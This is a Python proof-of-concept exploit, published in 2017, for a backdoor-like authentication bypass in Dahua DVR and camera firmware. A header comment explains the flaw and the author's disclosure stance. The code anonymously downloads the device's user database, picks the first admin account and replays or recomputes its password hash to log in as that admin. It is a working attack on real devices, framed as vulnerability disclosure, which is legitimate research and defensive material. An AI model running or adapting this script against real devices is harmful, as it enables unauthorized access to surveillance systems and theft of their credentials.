#!/usr/bin/python2.7
#
# Dahua backdoor PoC Generation 2 and 3
# Author: bashis <mcw noemail eu> March 2017
# Credentials: No Credentials needed (Exploited as Anonymous)
# Note: PoC intentionally missing essential details to be direct usable for anything else than login/logout.
#
# Vendor URL: http://www.dahuasecurity.com/
#
# Patched firmware can be downloaded from newly introduced 'Firmware download function'
# (Don't mind the old date stamps, these should all be the hotfixed updates)
# http://www.dahuasecurity.com/download_111.html
# 
#
# -[ Facts ]-
#
# 1) Requirements
# 1.1) You need to know what you want to request
# 1.2) You need to know how to request what you want
# - When you know this, remote device will give you what you want, without any complains
# 1.3) You need to know how to process the results of your requests
# 1.4) You need to know how to send your processed results back to remote device
# - When you know this, you will be granted full access to remote device, without any complains
#
# 2) Direct file access
# 2.1) /mnt/mtd/Config/{passwd|Account1} downloadable with /current_config/{passwd|Account1} by HTTP/HTTPS
# 2.2) User database hash in format: <username>:<realm>:<password>
# 2.3) /mnt/mtd are read/writable - so sensitive files could (must!) be somewhere else, protected, and not remotely accessible.
# 2.4) /mnt/mtd/Config contains also of intentionally public accessible files (WebCapConfig and preLanguage)
# 2.5) There is several other files that should (must!) not be remotely accessible either (Config1 for example)
#
# 3) Passing the hash
# 3.1) Generation 1 - Base64 encoded (Not in this PoC, since I don't know what I want to request, but I could guess same format as 2.2)
# 3.2) Generation 2 - No processing needed; only to pass on the hash
# 3.3) Generation 3 - New 'improved' MD5 random hash must be generated with additional details, that we simply requesting from remote
# 3.4) New MD5 random hash has to be generated as: <username>:<random>:[MD5 format as in user database (2.2)] 
#
# - Not less than three times, Dahua have been poking around in the file structure and in the relevant functions of the source code
# - Changed file names, structure of user database, added/removed both public and sensitive files.
# - And never once wondered;
# 1. 'Hm, why I'm allowed to access these newly added files without login request?'
# 2. 'Hm, I know that file is the user database, can I access that one too without login request?'
# 3. 'Hm, I know that file is the device config, can I access that one too without login request?'
# - Really? Are you kidding me?
#
# When you know all above, and have full access to remote device, the whole thing looks so easy, actually way too easy to be true.
#
#
# -[ Most importantly ]-
#
# 1) Undocumented direct access to certain file structures, and used from some of Dahuas own .js to load 'WebCapConfig' and 'preLanguage'
# 2) Direct and indirect re-usage of hashes possible, however with MD5 hash 'security improvements' in Generation 3
# 3) Essential needs for successful login we simply request from remote device and process, no need to guess nor bruteforce anything
# 4) Abnormally wide range of products and firmware versions that share same reliable attack method, to be 'just an vulnerability'
# - True vulnerability over a wide range products and firmware versions have always some unexpected anomalies, which is expected
# 5) Dahua has lots of debug code compiled into the Firmware that may/normally listening on TCP/6789, although protected by l/p authorization
# - Dahua has been kindly asked to remove all debug code from production firmware, as this access and code do not belong in end user devices
# 6) The admin account '888888' is claimed by Dahua to be limited for local login with 'monitor and mouse' only, and not from remote
# - However, that validation is done locally in users browser by 'loginEx.js', and has therefore no practical effect
# 7) The 'hotfix' remediation was done by hardcoding from full access to two intentionally public accessible files (WebCapConfig and preLanguage)
#
#
# -[ Did Dahua confirm the backdoor by mistake? ]-
#
# Don't know if you noticed that the 'new' patches that was pushed out days after my initital post at IPVM,
# they had different old date stamps, and same old date stamps (as on the archives) was on all inside binaries as well.
#
# Screenshots
# https://github.com/mcw0/PoC/blob/master/Dahua%20Wiki%20Firmware%20Timestamp.png
# https://github.com/mcw0/PoC/blob/master/Dahua%20Wiki%20Firmware%20listing.png
#
# URL
# http://us.dahuasecurity.com/en/us/Security-Bulletin_030617.php
# https://dahuawiki.com/images/Firmware/DVR/Q2.2017/
#
# And, bit interesting, Dahua continued to use old date stamps on newly generated firmware updates/hotfixes
#
# -[ Method of discovery ]-
#
# Researching by dissasembling of Dahuas main binaries 'Challenge' / 'Sonia'
# What got me curios, was abnormally empty inside of the image I was initally checking, and of course the big binary 'Challenge'
# What got me on track, was the lack of references to sensitive files
# Missing user database and Config in the archives, only a unused and read-only /etc/passwd was found
# Noticed that sensitive files was generated by the binary at startup
# Noticed checkings after sensitive files in different directories, to use 'defaults' as last resource
# Noticed the mix of intentionally public files and sensitive files in same directory
# Reading of the .htm and .js that was found in the image
# ...etc.
#
#
# -[ My Full Disclosure Policy ]-
#
# Normal vulnerabilites: I collect enough information about my findings and trying to notify the vendor to have coordinated disclosure
# Backdoors: If/when they are intended, the vendors wants to hide/keep them (of course), what would you suggest? Notify the vendor or Full Disclosure?
# Proof of claim: Screenshots or some Youtube video would not proof anything, so the claim couldn't be posted without real hard cold facts
# - Professionals within the CCTV industry needed to know, and the only place I knew were many of them, was at IPVM, and therefore the first post was made there.
#
#
# -[ Next Generation Backdoors ]-
#
# That is in my opinion vendors P2P Cloud solutions.
#
# With P2P, these kind of backdoor implementations as shown in this PoC will then not be needed,
# since with P2P you practically giving away your credentials and addresses to your devices!
# And the connection to P2P, your devices initiates and keeps open. (For me, it is similar to reverse shell)
#
#
# -[ Hat's ]-
#
# I don't wear hats, I wear caps... (when it's cold)
#
#
# -[ Function of this PoC code ]-
#
# 1) Check and dump the remote user database (Generation 2 or 3)
# 2) Find first availible admin user and extract their login/pwd hash
# 3) Request session ID, compute new hash if needed (Generation 3)
# 4) Login and logout to/from remote device
#
#
# -[ Credits ]-
#
# binwalk (https://github.com/devttys0/binwalk)
# - Nothing easy could been done without binwalk, awesome tool. Thanks!
#
# IPVM (https://ipvm.com/)
# - For pickup of the claim and to make PoC report, so this Python PoC could be taken down.
#
# Full Disclosure (http://seclists.org/fulldisclosure/)
# - For existing, without your e-mail list, sensitive stuff would be quite difficult to uncover.
# - Fyodor, thanks again.
#
# And, big thanks to all authors for all other stuff and tools that's needed to successfully execute research within binaries
# - To many for naming.
#
# Have a nice day
# /bashis
#

from __future__ import print_function
import string
import sys
import socket
import argparse
import urllib, urllib2, httplib
import base64
import ssl
import json
import commentjson # pip install commentjson
import hashlib

class HTTPconnect:

	def __init__(self, host, proto, verbose, creds, Raw):
		self.host = host
		self.proto = proto
		self.verbose = verbose
		self.credentials = creds
		self.Raw = Raw
	
	def Send(self, uri, query_headers, query_data,ID):
		self.uri = uri
		self.query_headers = query_headers
		self.query_data = query_data
		self.ID = ID

		# Connect-timeout in seconds
		timeout = 5
		socket.setdefaulttimeout(timeout)

		url = '{}://{}{}'.format(self.proto, self.host, self.uri)

		if self.verbose:
			print("[Verbose] Sending:", url)

		if self.proto == 'https':
			if hasattr(ssl, '_create_unverified_context'):
				print("[i] Creating SSL Unverified Context")
				ssl._create_default_https_context = ssl._create_unverified_context

		if self.credentials:
			Basic_Auth = self.credentials.split(':')
			if self.verbose:
				print("[Verbose] User:",Basic_Auth[0],"Password:",Basic_Auth[1])
			try:
				pwd_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
				pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
				auth_handler = urllib2.HTTPBasicAuthHandler(pwd_mgr)
				opener = urllib2.build_opener(auth_handler)
				urllib2.install_opener(opener)
			except Exception as e:
				print("[!] Basic Auth Error:",e)
				sys.exit(1)

		if self.query_data:
			request = urllib2.Request(url, data=json.dumps(self.query_data), headers=self.query_headers)
		else:
			request = urllib2.Request(url, None, headers=self.query_headers)
		response = urllib2.urlopen(request)
#		print response
		if response:
			print("[<] {} OK".format(response.code))

		if self.Raw:
			return response
		else:
			html = response.read()
			return html


class Dahua_Backdoor:

	def __init__(self, rhost, proto, verbose, creds, Raw):
		self.rhost = rhost
		self.proto = proto
		self.verbose = verbose
		self.credentials = creds
		self.Raw = Raw

	#
	# Generation 2
	#
	def Gen2(self,response,headers):
		self.response = response.read()
		self.headers = headers

		html = self.response.readlines()
		if self.verbose:
			for lines in html:
				print("{}".format(lines))
		#
		# Check for first availible admin user
		#
		for line in html:
			if line[0] == "#" or line[0] == "\n":
				continue
			line = line.split(':')[0:25]
			if line[3] == '1':		# Check if user is in admin group
				USER_NAME = line[1]	# Save login name
				PWDDB_HASH = line[2]# Save hash
				print("[i] Choosing Admin Login [{}]: {}, PWD hash: {}".format(line[0],line[1],line[2]))
				break

		#
		# Login 1
		#
		print("[>] Requesting our session ID")
		query_args = {"method":"global.login",
			"params":{
				"userName":USER_NAME,
				"password":"",
				"clientType":"Web3.0"},
			"id":10000}

		URI = '/RPC2_Login'
		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,None)

		json_obj = json.load(response)
		if self.verbose:
			print(json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': ')))

		#
		# Login 2
		#
		print("[>] Logging in")

		query_args = {"method":"global.login",
			"session":json_obj['session'],
			"params":{
				"userName":USER_NAME,
				"password":PWDDB_HASH,
				"clientType":"Web3.0",
				"authorityType":"OldDigest"},
			"id":10000}

		URI = '/RPC2_Login'
		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,json_obj['session'])
		print(response.read())

		#
		# Wrong username/password
		# { "error" : { "code" : 268632071, "message" : "Component error: password not valid!" }, "id" : 10000, "result" : false, "session" : 1997483520 }
		# { "error" : { "code" : 268632070, "message" : "Component error: user's name not valid!" }, "id" : 10000, "result" : false, "session" : 1997734656 }
		#
		# Successfull login
		# { "id" : 10000, "params" : null, "result" : true, "session" : 1626533888 }
		# 

		#
		# Logout
		#
		print("[>] Logging out")
		query_args = {"method":"global.logout",
			"params":"null",
			"session":json_obj['session'],
			"id":10001}

		URI = '/RPC2'
		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,None)
		return response

	#
	# Generation 3
	#
	def Gen3(self,response,headers):
		self.response = response.read()
		self.headers = headers
		#print self.response
		#json_obj = commentjson.loads(self.response)

		json_string = ""
		start=False
		for x in self.response:
			if(x[0]=='{' or start==True):
				start = True
				json_string = json_string + x
		json_obj = json.loads(json_string)



		if self.verbose:
			print(json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': ')))

		#
		# Check for first availible admin user
		#
		for who in json_obj[json_obj.keys()[0]]:
			if who['Group'] == 'admin':			# Check if user is in admin group
				USER_NAME = who['Name']			# Save login name
				PWDDB_HASH = who['Password']	# Save hash
				print("[i] Choosing Admin Login: {}".format(who['Name']))
				break
		#
		# Request login
		#
		print("[>] Requesting our session ID")
		query_args = {"method":"global.login",
			"params":{
				"userName":USER_NAME,
				"password":"",
				"clientType":"Web3.0"},
			"id":10000}

		URI = '/RPC2_Login'
		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,None)

		json_obj = json.load(response)
		if self.verbose:
			print(json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': ')))
		#
		# Generate login MD5 hash with all required info we have downloaded
		#
		RANDOM = json_obj['params']['random']
		PASS = ''+ USER_NAME +':' + RANDOM + ':' + PWDDB_HASH + ''
		RANDOM_HASH = hashlib.md5(PASS).hexdigest().upper()

		print("[i] Downloaded MD5 hash:",PWDDB_HASH)
		print("[i] Random value to encrypt with:",RANDOM)
		print("[i] Built password:",PASS)
		print("[i] MD5 generated password:",RANDOM_HASH)

		#
		# Login
		#
		print("[>] Logging in")

		query_args = {"method":"global.login",
			"session":json_obj['session'],
			"params":{
				"userName":USER_NAME,
				"password":RANDOM_HASH,
				"clientType":"Web3.0",
				"authorityType":"Default"},
			"id":10000}

		URI = '/RPC2_Login'
		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,json_obj['session'])
		print(response.read())

		# Wrong username/password
		# { "error" : { "code" : 268632071, "message" : "Component error: password not valid!" }, "id" : 10000, "result" : false, "session" : 1156538295 }
		# { "error" : { "code" : 268632070, "message" : "Component error: user's name not valid!" }, "id" : 10000, "result" : false, "session" : 1175812023 }
		#
		# Successfull login
		# { "id" : 10000, "params" : null, "result" : true, "session" : 1175746743 }
		#

		#
		# Logout
		#
		print("[>] Logging out")
		query_args = {"method":"global.logout",
			"params":"null",
			"session":json_obj['session'],
			"id":10001}

		URI = '/RPC2'
		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,None)
		return response

#
# Validate correctness of HOST, IP and PORT
#
class Validate:

	def __init__(self,verbose):
		self.verbose = verbose

	# Check if IP is valid
	def CheckIP(self,IP):
		self.IP = IP

		ip = self.IP.split('.')
		if len(ip) != 4:
			return False
		for tmp in ip:
			if not tmp.isdigit():
				return False
		i = int(tmp)
		if i < 0 or i > 255:
			return False
		return True

	# Check if PORT is valid
	def Port(self,PORT):
		self.PORT = PORT

		if int(self.PORT) < 1 or int(self.PORT) > 65535:
			return False
		else:
			return True

	# Check if HOST is valid
	def Host(self,HOST):
		self.HOST = HOST

		try:
			# Check valid IP
			socket.inet_aton(self.HOST) # Will generate exeption if we try with DNS or invalid IP
			# Now we check if it is correct typed IP
			if self.CheckIP(self.HOST):
				return self.HOST
			else:
				return False
		except socket.error as e:
			# Else check valid DNS name, and use the IP address
			try:
				self.HOST = socket.gethostbyname(self.HOST)
				return self.HOST
			except socket.error as e:
				return False



if __name__ == '__main__':

#
# Help, info and pre-defined values
#	
	INFO =  '[Dahua backdoor Generation 2 & 3 (2017 bashis <mcw noemail eu>)]\n'
	HTTP = "http"
	HTTPS = "https"
	proto = HTTP
	verbose = False
	raw_request = True
	rhost = '192.168.5.2'	# Default Remote HOST
	rport = '80'			# Default Remote PORT
	creds = False			# creds = 'user:pass'


#
# Try to parse all arguments
#
	try:
		arg_parser = argparse.ArgumentParser(
		prog=sys.argv[0],
				description=('[*] '+ INFO +' [*]'))
		arg_parser.add_argument('--rhost', required=False, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']')
		arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ rport +']')
		if creds:
			arg_parser.add_argument('--auth', required=False, help='Basic Authentication [Default: '+ creds + ']')
		arg_parser.add_argument('--https', required=False, default=False, action='store_true', help='Use HTTPS for remote connection [Default: HTTP]')
		arg_parser.add_argument('-v','--verbose', required=False, default=False, action='store_true', help='Verbose mode [Default: False]')
		args = arg_parser.parse_args()
	except Exception as e:
		print(INFO,"\nError: %s\n" % str(e))
		sys.exit(1)

	# We want at least one argument, so print out help
	if len(sys.argv) == 1:
		arg_parser.parse_args(['-h'])

	print("\n[*]",INFO)

	if args.verbose:
		verbose = args.verbose
#
# Check validity, update if needed, of provided options
#
	if args.https:
		proto = HTTPS
		if not args.rport:
			rport = '443'

	if creds and args.auth:
		creds = args.auth

	if args.rport:
		rport = args.rport

	if args.rhost:
		rhost = args.rhost

	# Check if RPORT is valid
	if not Validate(verbose).Port(rport):
		print("[!] Invalid RPORT - Choose between 1 and 65535")
		sys.exit(1)

	# Check if RHOST is valid IP or FQDN, get IP back
	rhost = Validate(verbose).Host(rhost)
	if not rhost:
		print("[!] Invalid RHOST")
		sys.exit(1)

#
# Validation done, start print out stuff to the user
#
	if args.https:
		print("[i] HTTPS / SSL Mode Selected")
	print("[i] Remote target IP:",rhost)
	print("[i] Remote target PORT:",rport)

	rhost = rhost + ':' + rport

	headers = {
		'X-Requested-With'	:	'XMLHttpRequest',
		'X-Request'	:	'JSON',
		'User-Agent':'Dahua/2.0; Dahua/3.0'
		}

	#
	# Try to find /current_config/passwd user database (Generation 2)
	#
	try:
		print("[>] Checking for backdoor version")
		URI = "/current_config/passwd"
		response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,headers,None,None)
		print("[!] Generation 2 found")
		reponse = Dahua_Backdoor(rhost,proto,verbose,creds,raw_request).Gen2(response,headers)
		print(response)
	except urllib2.HTTPError as e:
		#
		# If not, try to find /current_config/Account1 user database (Generation 3)
		#
		if e.code == 404:
			try:
				URI = '/current_config/Account1'
				response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,headers,None,None)
				print("[!] Generation 3 Found")
				response = Dahua_Backdoor(rhost,proto,verbose,creds,raw_request).Gen3(response,headers)
			except urllib2.HTTPError as e:
				if e.code == 404:
					print("[!] Patched or not Dahua device! ({})".format(e.code))
					sys.exit(1)
				else:
					print("Error Code: {}".format(e.code))
	except Exception as e:
		print("[!] Detect of target failed ({})".format(e))
		sys.exit(1)

	print("\n[*] All done...\n")
	sys.exit(0)


